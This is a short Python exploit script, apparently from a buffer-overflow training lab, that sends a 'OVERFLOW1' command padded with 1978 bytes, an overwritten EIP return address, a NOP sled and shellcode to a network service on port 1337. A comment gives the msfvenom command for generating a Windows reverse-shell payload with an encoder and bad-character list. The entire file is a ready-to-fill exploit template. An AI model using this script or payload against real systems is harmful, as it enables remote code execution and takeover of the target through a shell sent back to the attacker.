#!/usr/bin/env python3

import socket, time, sys

ip = "RHOST IP" # CHANGE THIS!

# Generate your payload
# msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x07\x2e\xa0"
shell_code = ("YOUR SHELL CODE HERE")

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

filler = "A" * 1978
eip = "\xaf\x11\x50\x62"
nops ="\x90" *10

string = prefix + filler + eip + nops + shell_code


try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    s.recv(1024)
    print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
except:
  print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
  sys.exit(0)
